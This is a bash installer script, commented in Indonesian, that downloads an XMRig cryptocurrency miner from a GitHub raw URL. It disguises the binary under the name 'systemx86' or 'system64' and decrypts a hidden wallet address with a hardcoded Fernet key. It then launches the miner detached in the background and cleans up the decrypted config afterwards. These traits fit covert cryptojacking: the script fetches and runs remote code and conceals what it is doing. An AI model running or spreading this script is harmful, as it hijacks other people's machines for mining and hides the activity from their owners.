#!/usr/bin/env bash
# Modified oneline.sh for encrypted XMRig config.
# Only the wallet address (user) is encrypted.

set -euo pipefail

REPO_USER="grayteams"
REPO_NAME="teams"
BRANCH="main"
RAW_URL="https://raw.githubusercontent.com/${REPO_USER}/${REPO_NAME}/${BRANCH}"

if ! command -v curl >/dev/null 2>&1 && ! command -v wget >/dev/null 2>&1; then
    echo "[-] curl DAN wget tidak ditemukan (minimal salah satu wajib ada)"; exit 1;
fi
command -v uname >/dev/null 2>&1 || { echo "[-] uname tidak ditemukan"; exit 1; }

# Download helper: pakai curl kalau ada, otomatis jatuh ke wget kalau curl tidak ada
download() {
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL -o "$2" "$1"
    else
        wget -q -O "$2" "$1"
    fi
}

ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64) BIN="systemx86" ;;
    aarch64|arm64) BIN="system64" ;;
    *) echo "[-] Arsitektur tidak didukung: $ARCH"; exit 1 ;;
esac

WORKDIR="$HOME/system"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

# Download encrypted config if not present
if [ ! -s config.linux.enc.json ]; then
    download "${RAW_URL}/config.linux.enc.json" config.linux.enc.json || { rm -f config.linux.enc.json; exit 1; }
fi

# Download binary if not present
if [ ! -s "$BIN" ]; then
    download "${RAW_URL}/$BIN" "$BIN" || { rm -f "$BIN"; exit 1; }
fi

[ -s config.linux.enc.json ] || { echo "[-] config.linux.enc.json kosong"; exit 1; }
[ -s "$BIN" ] || { echo "[-] binary $BIN kosong"; exit 1; }

chmod +x "$BIN"

# Decrypt wallet address in config
python3 - <<'PY'
import json
from cryptography.fernet import Fernet
key = "R7CbV_95OseVhHSTdPTOreR75-Dy1Y8LMmUIZnk0I_4=".encode()
fernet = Fernet(key)
with open("config.linux.enc.json", "r") as f:
    config = json.load(f)
for pool in config.get("pools", []):
    user = pool.get("user", "")
    if user.startswith("ENC:"):
        pool["user"] = fernet.decrypt(user[4:].encode()).decode()
with open("config.json", "w") as f:
    json.dump(config, f)
PY

# Run XMRig
nohup ./"$BIN" -c config.json "$@" > xmrig.log 2>&1 &
XMRIG_PID=$!
echo $XMRIG_PID > xmrig.pid
disown

# Cleanup: remove plaintext config once XMRig exits
(
    while kill -0 "$XMRIG_PID" 2>/dev/null; do
        sleep 5
    done
    rm -f config.json
    echo "[*] Removed plaintext config.json after XMRig exited"
) &

echo "[+] XMRig started with encrypted wallet address"
